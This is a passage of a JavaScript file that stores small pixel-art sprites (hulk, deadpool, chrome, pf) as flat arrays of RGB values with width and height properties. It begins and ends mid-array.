128, 11, 255, 128, 11, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 11, 255, 128, 11, 255, 128, 11, 255, 128, 11, 255, 128, 11, 255, 128, 11, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 128, 11, 255, 128, 11, 255, 0, 0, 0, 0, 0, 0, 128, 11, 255, 128, 11, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
hulk.width = 16;
hulk.height = 20;
var deadpool = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 139, 71, 1, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 255, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 255, 255, 255, 0, 0, 0, 139, 71, 1, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 71, 1, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 93, 93, 93, 0, 0, 0, 0, 0, 0, 139, 71, 1, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 71, 1, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 93, 93, 93, 0, 0, 0, 139, 71, 1, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 71, 1, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 255, 0, 0, 93, 93, 93, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 93, 93, 93, 93, 93, 93, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 0, 0, 0, 93, 93, 93, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 0, 0, 0, 0, 0, 0, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 0, 0, 0, 0, 0, 0, 0, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 139, 71, 1, 139, 71, 1, 139, 71, 1, 93, 93, 93, 139, 71, 1, 139, 71, 1, 139, 71, 1, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 93, 93, 93, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 93, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 93, 93, 93, 93, 93, 93, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 93, 93, 93, 93, 93, 93, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
deadpool.width = 21;
deadpool.height = 23;
var chrome = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 191, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 0, 0, 255, 255, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 255, 255, 255, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 255, 255, 255, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 255, 255, 255, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 255, 255, 255, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 47, 168, 255, 47, 168, 255, 47, 168, 255, 255, 255, 255, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 255, 244, 15, 255, 244, 15, 255, 244, 15, 255, 244, 15, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
chrome.width = 21;
chrome.height = 21;
var pf = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 250, 250, 250, 250, 250, 250, 255, 0, 0, 250, 250, 250, 255, 0, 0, 255, 0, 0, 250, 250, 250, 255, 0, 0, 250, 250, 250, 250, 250, 250, 255, 0, 0, 250, 250, 250, 250, 250, 250, 250, 250, 250, 255, 0, 0, 250, 250, 250, 250, 250, 250, 255, 0, 0, 250, 250, 250, 255, 0, 0, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 0, 0, 0, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 250, 